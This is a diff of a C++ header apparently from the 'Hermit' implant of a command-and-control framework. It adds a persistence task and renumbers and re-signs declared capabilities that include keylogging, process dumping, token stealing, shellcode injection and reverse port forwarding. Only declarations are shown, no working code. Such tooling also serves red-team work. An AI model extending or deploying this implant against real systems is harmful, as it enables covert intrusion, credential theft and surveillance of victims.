@@ -60,26 +60,27 @@
 #define TASK_MKDIR              0x19
 #define TASK_MV                 0x20
 #define TASK_NET                0x21
-#define TASK_PROCDUMP           0x22
-#define TASK_PS_KILL            0x23
-#define TASK_PS_LS              0x24
-#define TASK_PWD                0x25
-#define TASK_REG_QUERY          0x26
-#define TASK_RM                 0x27
-#define TASK_RMDIR              0x28
-#define TASK_RPORTFWD_ADD       0x29
-#define TASK_RPORTFWD_LS        0x30
-#define TASK_RPORTFWD_RM        0x31
-#define TASK_RUNAS              0x32
-#define TASK_SCREENSHOT         0x33
-#define TASK_SHELLCODE          0x34
-#define TASK_SLEEP              0x35
-#define TASK_TOKEN_REVERT       0x36
-#define TASK_TOKEN_STEAL        0x37
-#define TASK_UPLOAD             0x38
-#define TASK_USER_LS            0x39
-#define TASK_WHOAMI             0x40
-#define TASK_WHOAMI_PRIV        0x41
+#define TASK_PERSIST            0x22
+#define TASK_PROCDUMP           0x23
+#define TASK_PS_KILL            0x24
+#define TASK_PS_LS              0x25
+#define TASK_PWD                0x26
+#define TASK_REG_QUERY          0x27
+#define TASK_RM                 0x28
+#define TASK_RMDIR              0x29
+#define TASK_RPORTFWD_ADD       0x30
+#define TASK_RPORTFWD_LS        0x31
+#define TASK_RPORTFWD_RM        0x32
+#define TASK_RUNAS              0x33
+#define TASK_SCREENSHOT         0x34
+#define TASK_SHELLCODE          0x35
+#define TASK_SLEEP              0x36
+#define TASK_TOKEN_REVERT       0x37
+#define TASK_TOKEN_STEAL        0x38
+#define TASK_UPLOAD             0x39
+#define TASK_USER_LS            0x40
+#define TASK_WHOAMI             0x41
+#define TASK_WHOAMI_PRIV        0x42
 
 namespace Task
 {
@@ -107,17 +108,6 @@ namespace Task
         LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lPram);
     }
 
-    namespace Helper::Reg
-    {
-        HKEY GetRegRootKey(const std::wstring& wRootKey);
-        std::vector<std::wstring> ListRegSubKeys(
-            HKEY hRootKey,
-            const std::wstring& wSubKey,
-            DWORD dwOptions,
-            BOOL bRecursive
-        );
-    }
-
     namespace Helper::Screenshot
     {
         BOOL InitInstance(HINSTANCE hInstance, INT nCmdShow);
@@ -132,7 +122,6 @@ namespace Task
 
     namespace Helper::Token
     {
-        HANDLE GetTokenByPid(Procs::PPROCS pProcs, DWORD dwPid);
         BOOL CreateProcessWithStolenToken(Procs::PPROCS pProcs, HANDLE hToken, LPCWSTR appName);
     }
 
@@ -157,26 +146,27 @@ namespace Task
     std::wstring Mkdir(State::PSTATE pState, const std::wstring& wDir);
     std::wstring Mv(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring Net();
+    std::wstring Persist(State::PSTATE pState);
     std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid);
     std::wstring PsKill(State::PSTATE pState, const std::wstring& wPid);
     std::wstring PsLs(State::PSTATE pState, const std::wstring& wFilter, const std::wstring& wExclude);
     std::wstring Pwd(State::PSTATE pState);
-    std::wstring RegQuery(State::PSTATE pState, const std::wstring& wkeyPath, BOOL bRecursive);
-    std::wstring Rm(const std::wstring& wFile);
+    std::wstring RegQuery(State::PSTATE pState, const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecursive);
+    std::wstring Rm(State::PSTATE pState, const std::wstring& wFile);
     std::wstring Rmdir(const std::wstring& wDir);
     std::wstring RportfwdAdd(State::PSTATE pState, const std::wstring& wLIP, const std::wstring& wLPort, const std::wstring& wFwdIP, const std::wstring& wFwdPort);
     std::wstring RportfwdLs(State::PSTATE pState);
     std::wstring RportfwdRm(State::PSTATE pState);
-    std::wstring RunAs(const std::wstring& wUser, const std::wstring& wPassword, const std::wstring& wCmd);
+    std::wstring RunAs(State::PSTATE pState, const std::wstring& wUser, const std::wstring& wPassword, const std::wstring& wCmd);
     std::wstring Screenshot(State::PSTATE pState);
     std::wstring Shellcode(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
     std::wstring SleepSet(State::PSTATE pState, const std::wstring& wSleep);
     std::wstring TokenRevert();
     std::wstring TokenSteal(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wProcName, bool bLogin);
     std::wstring Upload(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
-    std::wstring Users();
-    std::wstring Whoami();
-    std::wstring WhoamiPriv();
+    std::wstring Users(State::PSTATE pState);
+    std::wstring Whoami(State::PSTATE pState);
+    std::wstring WhoamiPriv(State::PSTATE pState);
 }
 
 #endif // HERMIT_CORE_TASK_HPP
